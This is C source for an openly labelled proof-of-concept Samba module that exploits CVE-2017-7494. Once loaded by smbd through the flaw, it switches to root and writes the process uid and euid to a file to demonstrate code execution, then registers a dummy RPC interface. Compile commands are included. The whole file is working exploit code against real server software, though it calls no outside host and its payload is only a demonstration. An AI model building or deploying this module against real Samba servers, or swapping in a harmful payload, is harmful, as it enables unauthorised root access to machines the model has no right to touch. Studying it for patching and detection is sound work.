/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/

	Samba module for CVE-2017-7494 ( https://www.samba.org/samba/security/CVE-2017-7494.html )

	cc -m32 -shared -o lib_smb_pipe_x86.so -fPIC lib_smb_pipe.c
	cc -m64 -shared -o lib_smb_pipe_x64.so -fPIC lib_smb_pipe.c
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <pwd.h>
#include <time.h>
#include <libgen.h>

#define SMB_RPC_INTERFACE_VERSION 1
#define NT_STATUS_UNSUCCESSFUL (0xC0000000 | 0x00000001)
typedef uint32_t NTSTATUS;

struct GUID {
	uint32_t time_low;
	uint16_t time_mid;
	uint16_t time_hi_and_version;
	uint8_t clock_seq[2];
	uint8_t node[6];
};

struct ndr_syntax_id {
	struct GUID uuid;
	uint32_t if_version;
};

struct ndr_interface_table {
	const char *name;
	struct ndr_syntax_id syntax_id;
	const char *helpstring;
	uint32_t num_calls;
	const struct ndr_interface_call *calls;
	const struct ndr_interface_string_array *endpoints;
	const struct ndr_interface_string_array *authservices;
};

extern NTSTATUS rpc_srv_register(int version, const char *clnt, const char *srv, const struct ndr_interface_table *iface, const void /*struct api_struct*/ *cmds, int size, const void /*struct rpc_srv_callbacks*/ *rpc_srv_cb);
extern bool change_to_root_user(void);

static void *cmds;
static struct ndr_interface_table ndr_table_libpoc = {
	.name		= NULL,
	.syntax_id	= {{0xdeadbeef, 0x0000, 0x0000, {0x00, 0x00}, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}}, 1},
	.helpstring	= NULL,
	.num_calls	= 0,
	.calls		= NULL,
	.endpoints	= NULL,
	.authservices	= NULL
};

static char * path_dir_combine(const char *path, const char *file);

NTSTATUS samba_init_module(void)
{
	NTSTATUS status = NT_STATUS_UNSUCCESSFUL;	
	Dl_info info;
	FILE *file;
	char *filename;
	struct passwd *pw, *epw;

	change_to_root_user();
	if(dladdr(samba_init_module, &info))
	{
		pw = getpwuid(getuid());
		epw = getpwuid(geteuid());
		if(filename = path_dir_combine(info.dli_fname, "myid.txt"))
		{
			file = fopen(filename, "w");
			if(file)
			{		
				fprintf(file, "[smbd with module %s] uid: %u (%s) / euid: %u (%s)\n", info.dli_fname, pw->pw_uid, pw->pw_name, epw->pw_uid, epw->pw_name);
				fclose(file);
			}
			free(filename);
		}

		srand(time(NULL));
		ndr_table_libpoc.syntax_id.uuid.time_mid = rand() % 0x10000;
		ndr_table_libpoc.syntax_id.uuid.time_hi_and_version = rand() % 0x10000;
		status = rpc_srv_register(SMB_RPC_INTERFACE_VERSION, info.dli_fname, info.dli_fname, &ndr_table_libpoc, &cmds, 0, NULL);
	}
	return status;
}

NTSTATUS init_samba_module(void)
{
	return samba_init_module();
}

static char * path_dir_combine(const char *path, const char *file)
{
	char *result = NULL, *duppath, *mypath;
	size_t len;
	if(duppath = strdup(path))
	{
		if(mypath = dirname(duppath))
		{
		 	len = snprintf(NULL, 0, "%s/%s", mypath, file);
			if(len > 0)
			{
				if(result = malloc(len + 1))
				{
					if(snprintf(result, len + 1, "%s/%s", mypath, file) < len)
					{
						free(result);
						result = NULL;
					}
				}
			}
		}
		free(duppath);
	}
	return result;
}
